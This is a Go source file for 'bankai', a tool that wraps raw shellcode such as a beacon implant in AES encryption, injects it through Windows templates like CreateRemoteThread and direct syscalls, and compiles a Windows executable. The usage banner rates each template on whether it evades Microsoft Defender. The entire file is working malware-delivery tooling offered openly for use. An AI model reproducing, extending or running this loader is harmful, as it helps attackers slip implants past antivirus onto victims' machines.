package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	math "math/rand"
	"os"
	"os/exec"
	"strings"
	"time"

	"./source/template"
)

const (
	usage = ` 
    Required:
    -i            Binary File (e.g., beacon.bin)
    -o            Payload Output (e.g, payload.exe)
    -t            Payload Template (e.g., win32_VirtualProtect.tmpl)
    -a            Arch (32|64)
    
    Optional:
    -h            Print this help menu
    -p            PID

    Templates:                                     Last update: 06/02/21
    +-----------------------------------------------+------------------+
    | Techniques                                    | Bypass Defender  |
    +-----------------------------------------------+------------------+
    | win32_VirtualProtect.tmpl                     |        No        |
    +-----------------------------------------------+------------------+
    | win64_CreateFiber.tmpl                        |        No        |
    +-----------------------------------------------+------------------+
    | win64_CreateRemoteThreadNative.tmpl           |        Yes       | 
    +-----------------------------------------------+------------------+
    | win64_CreateThread.tmpl                       |        No        | 
    +-----------------------------------------------+------------------+
    | win64_EtwpCreateEtwThread.tmpl                |        No        | 
    +-----------------------------------------------+------------------+
    | win64_Syscall.tmpl                            |        No        | 
    +-----------------------------------------------+------------------+

    Example:

    ./bankai -i beacon.bin -o payload.exe -t win64_CreateThread.tmpl -a 64
   `
)

func banner() {
	banner := `
     _                 _         _ 
    | |               | |       (_)
    | |__   __ _ _ __ | | ____ _ _ 
    | '_ \ / _' | '_ \| |/ / _' | |
    | |_) | (_| | | | |   < (_| | |
    |_.__/ \__,_|_| |_|_|\_\__,_|_|
                        [bigb0ss]
	
    [INFO] Another Go Shellcode Loader
`
	fmt.Println(banner)
}

type menu struct {
	help      bool
	input     string
	output    string
	templates string
	arch      string
	pid       int
}

func options() *menu {
	input := flag.String("i", "", "raw payload")
	output := flag.String("o", "", "payload output")
	templates := flag.String("t", "", "payload template")
	arch := flag.String("a", "", "arch")
	pid := flag.Int("p", 0, "pid")
	help := flag.Bool("h", false, "Help Menu")

	flag.Parse()

	return &menu{
		help:      *help,
		input:     *input,
		output:    *output,
		templates: *templates,
		arch:      *arch,
		pid:       *pid,
	}
}

func readFile(inputFile string) string {

	// Write hexdump file from binary file (.bin)
	dumpFile := "output/shellcode.hexdump"

	f, err := os.Create(dumpFile)
	if err != nil {
		fmt.Printf("[ERROR] %s\n", err)
	}
	defer f.Close()

	content, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Printf("[ERROR] %s\n", err)
	}

	binToHex := hex.Dump(content)
	f.WriteString(binToHex)

	// Read & Parse shellcode
	file, err := os.Open(dumpFile)

	if err != nil {
		fmt.Printf("[ERROR] %s\n", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()

	shellcode := ""
	for _, eachline := range txtlines {
		column := eachline[10:58] // Stupid way to parse hexdump
		noSpace := strings.ReplaceAll(column, " ", "")
		noNewline := strings.TrimSuffix(noSpace, "\n")
		shellcode += noNewline
	}

	return shellcode
}

// Random Key Generator (128 bit)
var chars = []rune("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")

func randKeyGen(n int) string {

	charSet := make([]rune, n)
	for i := range charSet {
		charSet[i] = chars[math.Intn(len(chars))]
	}
	return string(charSet)
}

// Encrpyt: Original Text --> Add IV --> Encrypt with Key --> Base64 Encode
func Encrypt(key []byte, text []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// Creating IV
	ciphertext := make([]byte, aes.BlockSize+len(text))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	// AES Encrpytion Process
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], text)

	// Base64 Encode
	return base64.URLEncoding.EncodeToString(ciphertext)
}

func main() {

	opt := options()
	if opt.help {
		banner()
		fmt.Println(usage)
		os.Exit(0)
	}

	if opt.input == "" || opt.output == "" || opt.templates == "" || opt.arch == "" {
		fmt.Println(usage)
		os.Exit(0)
	}

	if opt.templates == "win64_CreateRemoteThreadNative.tmpl" && opt.pid == 0 {
		fmt.Println("[ERROR] For this template, you must use PID (-p).")
		os.Exit(1)
	}

	inputFile := opt.input
	outputFile := opt.output
	tmplSelect := opt.templates
	arch := opt.arch
	pid := opt.pid

	shellcodeFromFile := readFile(inputFile)

	// AES Encrypt Process
	math.Seed(time.Now().UnixNano())

	key := []byte(randKeyGen(32)) //Key Size: 16, 32
	fmt.Printf("[INFO] Key: %v\n", string(key))

	encryptedPayload := Encrypt(key, []byte(shellcodeFromFile))
	fmt.Println("[INFO] AES encrpyting the payload...")

	// Creating an output file with entered shellcode
	file, err := os.Create("output/shellcode.go")
	if err != nil {
		fmt.Printf("[ERROR] %s\n", err)
	}
	defer file.Close()

	// Template creation with shellcode
	vars := make(map[string]interface{})
	//vars["Shellcode"] = shellcodeFromFile
	vars["Shellcode"] = encryptedPayload
	vars["Key"] = string(key)
	vars["Pid"] = pid
	r := template.ProcessFile("templates/"+tmplSelect, vars)

	_, err = io.WriteString(file, r)
	if err != nil {
		fmt.Printf("[ERROR] %s\n", err)
	}

	// Compling the output shellcode loader
	cmd := exec.Command(
		"go",
		"build",
		"-ldflags=-s", // Using -s instructs Go to create the smallest output
		"-ldflags=-w", // Using -w instructs Go to create the smallest output
		"-o", outputFile,
		"output/shellcode.go",
	)

	archTech := ""
	if arch == "32" {
		archTech = "386"
		fmt.Println("[INFO] Arch: x86 (32-bit)")
	} else if arch == "64" {
		archTech = "amd64"
		fmt.Println("[INFO] Arch: x64 (64-bit)")
	} else {
		fmt.Println("[ERROR] Arch must be 32 or 64")
		os.Exit(1)
	}

	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH="+archTech,
	)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
	fmt.Printf("[INFO] Template: %s\n", tmplSelect)
	fmt.Printf("[INFO] InputFile: %s\n", inputFile)
	fmt.Printf("[INFO] OutputFile: %s\n", outputFile)

}
